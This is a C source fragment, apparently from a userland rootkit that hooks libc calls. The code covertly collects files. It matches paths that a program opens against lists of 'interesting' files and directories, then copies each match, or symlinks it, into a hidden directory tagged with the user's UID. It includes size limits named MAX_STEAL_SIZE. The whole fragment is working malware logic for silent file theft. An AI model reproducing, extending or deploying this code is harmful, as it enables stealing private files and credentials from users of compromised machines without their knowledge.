#ifdef BLACKLIST_TOO
int uninteresting(char *path){
    for(int i = 0; i < NAMESBLACKLIST_SIZE; i++){
        if(!strncmp(namesblacklist[i], path, strlen(namesblacklist[i])))
            return 1;

        if(!fnmatch(namesblacklist[i], path, FNM_PATHNAME))
            return 1;
    }
    return 0;
}
#endif

#if defined SYMLINK_FALLBACK || defined SYMLINK_ONLY
int linkfile(const char *oldpath, char *newpath){
    hook(CSYMLINK);
    char newnewpath[strlen(newpath)+6];
    snprintf(newnewpath, sizeof(newnewpath), "%s-link", newpath);

    if(oldpath[0] == '/')
        return (long)call(CSYMLINK, oldpath, newnewpath);
    
    // if oldpath is not a full pathname we must get it now
    char *cwd, *oldoldpath;

    cwd = getcwd(NULL, 0);
    if(cwd == NULL) return 1;
    oldoldpath = fullpath(cwd, oldpath);
    free(cwd);

    int ret = (long)call(CSYMLINK, oldoldpath, newnewpath);
    free(oldoldpath);
    return ret;
}
#endif

char *fullpath(char *cwd, const char *file){
    size_t pathlen = strlen(cwd)+strlen(file)+2;
    char *ret = malloc(pathlen);
    memset(ret, 0, pathlen);
    snprintf(ret, pathlen, "%s/%s", cwd, file);
    return ret;
}

int fileincwd(char *cwd, const char *file){
    int incwd=0;
    char *curpath = fullpath(cwd, file);

    hook(CACCESS);
    if((long)call(CACCESS, curpath, F_OK) == 0)
        incwd=1;

    free(curpath);
    return incwd;
}

#ifdef DIRECTORIES_TOO
int interestingdir(const char *path){
    int interest=0;
    char *cwd = getcwd(NULL, 0), *intdir;
    if(cwd != NULL){
        for(int i = 0; i != INTERESTING_DIRECTORIES_SIZE; i++){
            intdir = interesting_directories[i];

            if(!strncmp(intdir, cwd, strlen(intdir)) && fileincwd(cwd, path)){
                interest = 1;
                break;
            }

            if(!strncmp(intdir, path, strlen(intdir))){
                interest = 1;
                break;
            }
        }

        free(cwd);
    }

    return interest;
}
#endif

int interesting(const char *path){
    char *interesting_file;
    int interest = 0;

    for(int i = 0; i < INTERESTING_FILES_SIZE; i++){
        interesting_file = interesting_files[i];
        if(!strncmp(interesting_file, path, strlen(interesting_file))){
            interest = 1;
            break;
        }

        if(!fnmatch(interesting_file, path, FNM_PATHNAME)){
            interest = 1;
            break;
        }
    }

#ifdef DIRECTORIES_TOO
    if(interest != 1 && interestingdir(path))
        interest = 1;
#endif

    return interest;
}

int writecopy(const char *oldpath, char *newpath){
    struct stat nstat; // for newpath, should it exist, to check if there's a change in size.
    int statr;
    unsigned char *buf;
    FILE *ofp, *nfp;
    size_t n, m;
    off_t blksize, fsize;
    mode_t mode;

    hook(CFWRITE, C__XSTAT);

    ofp = bindup(oldpath, newpath, &nfp, &fsize, &mode);
    if(ofp == NULL && errno == ENOENT) return 1;
    else if(ofp == NULL) return -1;

    memset(&nstat, 0, sizeof(struct stat));
    statr = (long)call(C__XSTAT, _STAT_VER, newpath, &nstat);

    if(!S_ISREG(mode) || (statr && nstat.st_size == fsize)){
        fclose(ofp);
        fclose(nfp);
        return 1;
    }

    if(statr < 0 && errno != ENOENT){
        fclose(ofp);
        fclose(nfp);
        return 1;
    }

#ifdef MAX_FILE_SIZE
    if(fsize > MAX_FILE_SIZE){
        fclose(ofp);
        fclose(nfp);
        return -1;
    }
#endif
#ifdef MAX_STEAL_SIZE
    if(getnewsize(fsize) > MAX_STEAL_SIZE){
        fclose(ofp);
        fclose(nfp);
        return -1;
    }
#endif

    blksize = getablocksize(fsize);
    do{
        buf = malloc(blksize+1);
        memset(buf, 0, blksize+1);
        n = fread(buf, 1, blksize, ofp);
        if(n){
            m = (long)call(CFWRITE, buf, 1, n, nfp);
            fflush(nfp);
        }else m = 0;
        fflush(ofp);
        free(buf);
    }while(n > 0 && n == m);

    fclose(ofp);
    fclose(nfp);

#ifdef KEEP_FILE_MODE
    hook(CCHMOD);
    if(copystat)
        call(CCHMOD, newpath, mode);
#endif

    return 1;
}

char *getnewpath(char *filename){
    int path_maxlen = strlen(INTEREST_DIR) +
                      strlen(filename) + 32;
    char *ret, *filenamedup = strdup(filename);

    if(filenamedup[0] == '.') // remove prefixed '.' if there is one.
        memmove(filenamedup, filenamedup + 1, strlen(filenamedup));

    ret = malloc(path_maxlen);
    memset(ret, 0, path_maxlen);
    snprintf(ret, path_maxlen, "%s/%d-%s",
                                INTEREST_DIR,
                                getuid(),
                                filenamedup);

    free(filenamedup);
    return ret;
}

int takeit(const char *oldpath, char *newpath){
#ifdef SYMLINK_ONLY
    return linkfile(oldpath, newpath);
#else
    int copystat = writecopy(oldpath, newpath);
#ifdef SYMLINK_FALLBACK
    if(copystat < 0)
        return linkfile(oldpath, newpath);
#endif
    return copystat;
#endif
}


void inspectfile(const char *pathname){
    char *dupdup   = strdup(pathname),
         *filename = basename(dupdup),
         *newpath;

    if(interesting(pathname) || interesting(filename)){
        newpath = getnewpath(filename);

#ifdef BLACKLIST_TOO
        if(!uninteresting(filename))
            takeit(pathname, newpath);
#else
        takeit(pathname, newpath);
#endif
        free(newpath);
    }

    free(dupdup);
}
